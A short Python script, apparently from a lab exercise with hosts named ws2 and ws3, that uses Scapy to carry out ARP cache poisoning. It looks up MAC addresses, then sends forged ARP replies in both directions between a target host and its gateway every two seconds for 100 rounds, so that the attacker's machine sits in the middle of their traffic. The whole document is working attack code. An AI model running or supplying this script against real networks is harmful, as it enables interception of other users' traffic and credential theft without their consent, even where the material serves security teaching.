from scapy.all import *
import time

def get_mac(gateway_ip):
    # Craft ARP request packet for the gateway
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway_ip)

    # Send ARP request and capture ARP reply
    arp_reply = srp(arp_request, timeout=2, verbose=False)[0]

    # Extract MAC address from ARP reply
    if arp_reply:
        gateway_mac = arp_reply[0][1].hwsrc
        return gateway_mac
    else:
        return None
    

def spoof(target_ip, spoof_ip): 
    packet = ARP(op = 2, pdst = target_ip, hwdst=get_mac(target_ip), psrc = spoof_ip) 
    send(packet, verbose = False)

gateway_ip = "10.1.0.1" #IP address of interface eth0
target_ip = "10.1.0.2" #IP address of ws2
attacker_mac = get_if_hwaddr("ws3-eth0")  # MAC address of ws3
target_mac = get_mac(target_ip)


# poison, send every 2 seconds
for _ in range(100):
    spoof(target_ip, gateway_ip) 
    spoof(gateway_ip, target_ip) 
    time.sleep(2)


